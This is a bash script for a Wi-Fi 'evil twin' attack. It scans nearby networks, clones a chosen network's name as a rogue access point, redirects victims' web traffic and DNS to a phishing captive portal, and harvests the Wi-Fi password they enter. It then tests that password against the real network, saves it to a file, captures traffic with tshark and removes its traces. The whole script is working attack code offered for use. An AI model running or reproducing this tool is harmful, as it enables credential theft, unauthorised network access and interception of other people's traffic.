#!/bin/bash


user=$(whoami)
APACHE_LOG_DIR="/var/log/apache2"
#network
wireless_interface_name=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)
wifi_networks_scanner=$(iwlist $wireless_interface_name scan 2> /dev/null| grep "ESSID"| cut -d '"' -f 2)

#colors
Color_Off="\033[0m"  
RED="\033[0;31m"
GREEN="\033[0;32m"
 
## Privilege check
clear 
sleep 2

echo "
██╗    ██╗██╗███████╗██╗    ███████╗██╗   ██╗██╗██╗         ████████╗██╗    ██╗██╗███╗   ██╗
██║    ██║██║██╔════╝██║    ██╔════╝██║   ██║██║██║         ╚══██╔══╝██║    ██║██║████╗  ██║
██║ █╗ ██║██║█████╗  ██║    █████╗  ██║   ██║██║██║            ██║   ██║ █╗ ██║██║██╔██╗ ██║
██║███╗██║██║██╔══╝  ██║    ██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║███╗██║██║██║╚██╗██║
╚███╔███╔╝██║██║     ██║    ███████╗ ╚████╔╝ ██║███████╗       ██║   ╚███╔███╔╝██║██║ ╚████║
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝"

if [ $user = root ]; then
	echo "[*] You are root"
else
	echo -e "${RED}[-] Run script as root"
	exit 1
fi

if [ -f "db_conf.sh" ] && [ -f "file.zip" ]; then
    path_to_file=$(pwd)
else
    echo "[-] Could not find either db_conf.sh or file.zip"
    exit 1
fi

## Preparation for future
function Preparation()
{
	output=$(iwconfig 2> /dev/null)	
	if echo $output | grep -q '802.11'; then
		echo "[*] Wlan interface is up"
	else
		echo "[-] Error. Wlan interface doesn't exist"
		exit 1
	fi
	
	if echo $output | grep -q 'ESSID'; then
		Current_connected_net=$(iwconfig 2> /dev/null | awk '/ESSID/ {print}' | cut -d '"' -f 2)
	else
		Current_connected_net='None'
	fi
	# function mac_changer()
	# {
	# 	#macchanger here
	# }
}


## Wifi network scan and comparison
function Wifi_networks_scan()
{
	declare -a networks_list=($wifi_networks_scanner)
	length=${#networks_list[@]}

	echo "[*] Choose target network:" 
	echo '**********************************************************'
	for (( number=0; number<length; number++ )); do
		echo "[$number]" "${networks_list[$number]}"
	done

	echo '**********************************************************'

	while true; do
		read -p "[?] Enter network name you want to clone: " selected_network
		if [ "$Current_connected_net" != 'None' ] && [ "$selected_network" = "$Current_connected_net" ]; then
			echo "[-] Error. You are connected to the same network."
			echo "[-] Please choose another one."
		elif [[ "$wifi_networks_scanner" == *"$selected_network"* ]]; then
			echo "[*] You selected - $selected_network, proceeding..."
			break
		else
			echo "[-] $selected_network doesn't exist."
		fi
	done
}


## Setting up an access point
function AP_set_up()
{	
	echo "[*] Putting device in monitor mode..."
	airmon-ng start $wireless_interface_name >/dev/null
	
	monitor_mode=$(iwconfig 2> /dev/null | grep "IEEE" | cut -d " " -f 1)

	echo "[*] Creating directory in /opt/access_point"
	mkdir /opt/access_point > /dev/null 2>&1

	echo "[*] Creating hostapd.conf file"
	echo "interface=$monitor_mode
driver=nl80211
ssid=$selected_network
hw_mode=g
channel=7
macaddr_acl=0
ignore_broadcast_ssid=0" > /opt/access_point/hostapd.conf
	sleep 1

	echo "[*] Creating dnsmasq.conf file"
	echo "interface=$monitor_mode
dhcp-range=192.168.0.2,192.168.0.30,255.255.255.0,12h
dhcp-option=3,192.168.0.1
dhcp-option=6,192.168.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1" > /opt/access_point/dnsmasq.conf
	sleep 2
	
	ifconfig $monitor_mode up 192.168.0.1 netmask 255.255.255.0
	route add -net 192.168.0.0 netmask 255.255.255.0 gw 192.168.0.1
	echo 1 > /proc/sys/net/ipv4/ip_forward 
	
	echo "[*] Managing traffic routing"
	iptables --flush
	iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
 	iptables --append FORWARD --in-interface $monitor_mode -j ACCEPT
   	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.0.1:80
   	iptables -t nat -A POSTROUTING -j MASQUERADE
	
	echo "[*] Unzipping files to /var/www/captiveportal"
	mkdir /var/www/captiveportal
	mv file.zip /opt/access_point 
	unzip -qq /opt/access_point/file.zip -d /var/www/captiveportal
	
	echo "[*] Altering apache2 settings"
	echo "<VirtualHost *:80>
    ServerName captiveportal.local
    DocumentRoot /var/www/captiveportal
    ErrorLog ${APACHE_LOG_DIR}/captiveportal-error.log
    CustomLog ${APACHE_LOG_DIR}/captiveportal-access.log combined
</VirtualHost>" > /etc/apache2/sites-enabled/captiveportal.conf
	sleep 2
	

	service apache2 start
	service mysql start
	echo "[*] Opening terminals..."
	
	declare -a xtmux_pid=()

	tmux new-session -d -s Evil-Twin

	tmux new-window -t Evil-Twin:1 -n "Control Panel" "xterm -geometry 94x73--61--67 -hold -T Control_Panel -fs 30 -e bash -c 'source $path_to_file/db_conf.sh'"
	sleep 1
	tmux new-window -t Evil-Twin:2 -n "AP" "xterm -geometry 125x25+-61+86 -hold -T AP -fg green -fs 30 -e hostapd /opt/access_point/hostapd.conf"
	sleep 1
	tmux new-window -t Evil-Twin:3 -n "DHCP" "xterm -geometry 125x25+-61+399 -hold -T DHCP -fg red -fs 30 -e dnsmasq -C /opt/access_point/dnsmasq.conf -d"
	sleep 1
	tmux new-window -t Evil-Twin:4 -n "DNS" "xterm -geometry 118x42+640+86 -hold -T DNS -fg blue -fs 30 -e dnsspoof -i $monitor_mode"
	sleep 1
	tmux new-window -t Evil-Twin:5 -n "Webserver" "xterm -geometry 226x28+-61--67  -hold -T Webserver_logs -fg yellow -fs 30 -e multitail $APACHE_LOG_DIR/captiveportal-access.log"
	sleep 1

	tmux_pid+=($(ps --no-header  aux | grep "xterm" | grep -v "grep" | awk '{print $2}' | tr '\n' ' '))
	db_conf_pid="${xtmux_pid[0]}"

	while true; do
		if [ $? -eq 1 ]; then 
			echo "[-] Problem occured. Quiting..."
			exit 1
		else
			if [[ ! "${tmux_pid[@]}" =~ "$db_conf_pid" ]]; then
				echo -e  "[*] Captured password"
				tmux_pid+=($(ps --no-header  aux | grep "xterm" | grep -v "grep" | awk '{print $2}' | tr '\n' ' '))
				xtmux_pid_lenght=${#xtmux_pid[@]}
				for pid in "${tmux_pid[@]}"; do
					kill -9 $pid
					sleep 1
				done
				tmux kill-session -t Evil-Twin
				break
			else
				:
			fi
		fi
	done
	
	sleep 2 
}

## Network reconnaissance and traffic dump
function network_recon()
{	
	echo -e $Color_Off
	echo "[*] Replug your adapter..."
	sleep 5
	echo "[*] Cleaning up..."
	delete 
	sleep 2
	if [ $password1 = $password2 ]; then
		nmcli d wifi connect "$selected_network" password $password1 ifname $wireless_interface_name > /dev/null
		if [ $? -eq 0 ]; then
			echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password1] password"
			echo "Wifi password is: $password1" > /root/wifi_password.txt
		else
			echo -e "${RED}[-] Password wasn't found! Exiting..."
			echo "Wifi password wasn't found! Two different passwords were provided: $password1; $password2" > /root/wifi_password.txt
			exit 1
		fi
	else
		nmcli d wifi connect "$selected_network" password $password1 ifname $wireless_interface_name > /dev/null
		if [ $? -eq 1 ]; then
			echo "[-] Coundn't connect to $selected_network with [$password1] password! Trying another one..."
			sleep 1
			nmcli d wifi connect "$selected_network" password $password2 ifname $wireless_interface_name > /dev/null
			if [ $? -eq 0 ]; then
				echo -e "${GREEN}[*] Successfully connected to $selected_network with [$password2] password"
				echo "Wifi password is: $password1" > /root/wifi_password.txt
			else
				echo -e "${RED}[-] Password wasn't found! Exiting..."
				echo "Wifi password wasn't found! Two different passwords were provided: $password1; $password2" > /root/wifi_password.txt
				exit 1
			fi
		fi
	fi

	sleep 4
	if [ $? -eq 0 ]; then
		read -p "[*] How long to you to intercept the traffic [sec]: " time
		tshark -w /tmp/capture.pcap -a duration:$time > /dev/null
		echo '[*] Captured traffic saved in /tmp/capture.pcap file'
	fi
}


## Removing unnecessary created processes, files and services
function delete()
{	
	echo '[*] Deleting mysql user..'
	sleep 1
	mysql -e "DROP USER '${username}'@'localhost';"
	echo "[*] Deleting database..."
	sleep 1
	mysql -e "DROP DATABASE ${dbname};"
	echo '[*] Exiting monitor mode...'
	airmon-ng stop $monitor_mode > /dev/null
	sleep 1
	service NetworkManager restart
	echo '[*] Stopping services...'
	sleep 2
	service apache2 stop
	service mysql stop
	iptables --flush
	route del -net 192.168.0.0 netmask 255.255.255.0
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo '[*] Removing used files...'
	rm /etc/apache2/sites-enabled/captiveportal.conf
	rm $APACHE_LOG_DIR/captiveportal-access.log
	rm $APACHE_LOG_DIR/captiveportal-error.log
	rm -rf /var/www/captiveportal
	rm -rf /opt/access_point
}


## Final funtion
function pwn()
{
	Preparation
	Wifi_networks_scan
	AP_set_up
	network_recon
}

pwn
